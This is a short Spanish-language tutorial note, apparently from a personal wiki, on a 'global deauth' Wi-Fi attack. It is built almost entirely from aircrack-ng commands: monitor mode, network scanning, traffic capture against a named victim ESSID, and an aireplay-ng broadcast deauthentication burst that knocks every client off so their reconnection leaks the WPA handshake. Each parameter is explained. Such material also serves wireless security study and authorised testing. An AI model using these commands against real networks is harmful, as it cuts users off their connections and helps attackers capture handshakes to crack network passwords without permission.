# DeAuth Global
Esto lo que hace es desautentificar a cualquiera que se encuentre en la red victima

	airmon-ng wlan1 start
Iniciar la tarjeta de red en modo monitor

	airodump-ng wlan1mon
Escanear las redes disponibles
DOB66F5A4CBF

	airodump-ng -w CapturaDeAuthGlobal --essid INFINITUM33B5 wlan1mon
Con esto lo que se hace es capturar todoel trafico que pasa por la red y guardarlo en un archivo, aqui es donde se capturara el [[HandShake]]

	aireplay-ng -0 10 -e INFINITUM33B5 -c FF:FF:FF:FF:FF:FF wlan1mon
Esto manda 10 paquetes de desautentificacion a todos los dispositivos conectados al essid proporcionado por medio del [[Broadcast]]
- 0 *espicificamos que es un ataque DeAuth*
- 10 *la cantidad de paquetes de deseautentificacion enviados*
- e *essid de la red victima*
- c *broadcast* (Este parametro se puede omitir, ya que Air lo incluye)

Despues de esto los dispositivos seran desconectados y reconectados a las red automaticamente, para esto nuestra tarjeta de red habra capturado el [[HandShake]].